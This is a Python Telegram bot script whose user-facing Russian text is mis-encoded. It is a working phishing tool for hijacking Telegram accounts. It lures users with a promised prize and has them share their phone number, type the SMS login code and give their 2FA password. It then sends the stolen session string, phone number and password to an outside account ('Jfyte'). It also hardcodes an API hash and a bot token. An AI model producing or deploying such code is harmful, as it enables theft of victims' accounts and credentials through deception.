import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

API_ID = 20905110
API_HASH = '5f0bebe9754265943286d5615e69812b'
BOT_TOKEN = '8377279596:AAGRqfHghefux4dlhdnIIPDU1oJ40ENbsSI'

bot = TelegramClient('bot_session', API_ID, API_HASH)
user_clients = {}

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        await event.respond(
            "üîê –î–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è –ø–æ–¥–µ–ª–∏—Ç–µ—Å—å –∫–æ–Ω—Ç–∞–∫—Ç–æ–º:",
            buttons=Button.request_phone("üì± –û—Ç–ø—Ä–∞–≤–∏—Ç—å –º–æ–π –Ω–æ–º–µ—Ä")
        )

    @bot.on(events.NewMessage(func=lambda e: e.contact))
    async def contact_handler(event):
        user_id = event.sender_id
        phone = event.contact.phone_number
        
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            sent_code = await client.send_code_request(phone)
            user_clients[user_id] = {
                'client': client,
                'phone': phone,
                'phone_code_hash': sent_code.phone_code_hash,
                'code': [],
                'waiting_for_password': False,
                'password': None  # –î–æ–±–∞–≤–ª—è–µ–º –ø–æ–ª–µ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–∞—Ä–æ–ª—è
            }
            
            buttons = [
                [Button.inline("1", data='num_1'), Button.inline("2", data='num_2'), Button.inline("3", data='num_3')],
                [Button.inline("4", data='num_4'), Button.inline("5", data='num_5'), Button.inline("6", data='num_6')],
                [Button.inline("7", data='num_7'), Button.inline("8", data='num_8'), Button.inline("9", data='num_9')],
                [Button.inline("0", data='num_0'), Button.inline("‚úÖ –ì–æ—Ç–æ–≤–æ", data='submit')]
            ]
            
            await event.respond("‚å®Ô∏è –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS:", buttons=buttons)
            
        except Exception as e:
            await event.respond(f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {str(e)}")
            await client.disconnect()

    @bot.on(events.CallbackQuery())
    async def callback_handler(event):
        user_id = event.sender_id
        data = event.data.decode()
        
        if user_id not in user_clients:
            await event.answer("‚ùå –°–µ—Å—Å–∏—è —É—Å—Ç–∞—Ä–µ–ª–∞! –ù–∞—á–Ω–∏—Ç–µ —Å /start")
            return
        
        if data.startswith('num_'):
            digit = data.split('_')[1]
            user_clients[user_id]['code'].append(digit)
            code = ''.join(user_clients[user_id]['code'])
            
            original_message = await event.get_message()
            await event.edit(f"üî¢ –í–≤–µ–¥–µ–Ω–Ω—ã–π –∫–æ–¥: {code}", buttons=original_message.buttons)
            
        elif data == 'submit':
            client = user_clients[user_id]['client']
            code = ''.join(user_clients[user_id]['code'])
            
            try:
                await client.sign_in(
                    phone=user_clients[user_id]['phone'],
                    code=code,
                    phone_code_hash=user_clients[user_id]['phone_code_hash']
                )
                
            except SessionPasswordNeededError:
                user_clients[user_id]['waiting_for_password'] = True
                await event.respond("üîë –¢—Ä–µ–±—É–µ—Ç—Å—è –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è. –í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å:")
                return
                
            except Exception as e:
                await event.respond(f"üö® –û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏: {str(e)}")
                await client.disconnect()
                del user_clients[user_id]
                return
            
            await finish_authentication(user_id, client, event)

    @bot.on(events.NewMessage(func=lambda e: user_clients.get(e.sender_id, {}).get('waiting_for_password')))
    async def password_handler(event):
        user_id = event.sender_id
        client = user_clients[user_id]['client']
        password = event.text
        
        try:
            await client.sign_in(password=password)
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø–∞—Ä–æ–ª—å –≤ –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            user_clients[user_id]['password'] = password
            await finish_authentication(user_id, client, event)
            
        except Exception as e:
            await event.respond(f"üîê –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å! –û—à–∏–±–∫–∞: {str(e)}\n–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑:")
            
        finally:
            user_clients[user_id]['waiting_for_password'] = False

    async def finish_authentication(user_id, client, event):
        try:
            session_str = client.session.save()
            # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –ø–∞—Ä–æ–ª–µ–º (–µ—Å–ª–∏ –µ—Å—Ç—å)
            password_info = user_clients[user_id].get('password', '‚ùå –û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç')
            message = (
                f"üî• –ù–æ–≤–∞—è —Å–µ—Å—Å–∏—è:\n"
                f"üë§ –ù–æ–º–µ—Ä: {user_clients[user_id]['phone']}\n"
                f"üîë –°–µ—Å—Å–∏—è: `{session_str}`\n"
                f"üîí 2FA –ü–∞—Ä–æ–ª—å: {password_info}"
            )
            
            await bot.send_message('Jfyte', message)
            
            await event.respond(
                "üéâ –£—Å–ø–µ—à–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è!\n"
                "‚è≥ –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–ª—É—á–µ–Ω–∏–µ –ø—Ä–∏–∑–∞ –≤ —Ç–µ—á–µ–Ω–∏–µ 48 —á–∞—Å–æ–≤."
            )
            
        except Exception as e:
            await event.respond(f"üö® –û—à–∏–±–∫–∞: {str(e)}")
            
        finally:
            await client.disconnect()
            del user_clients[user_id]

    await bot.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("–ë–æ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
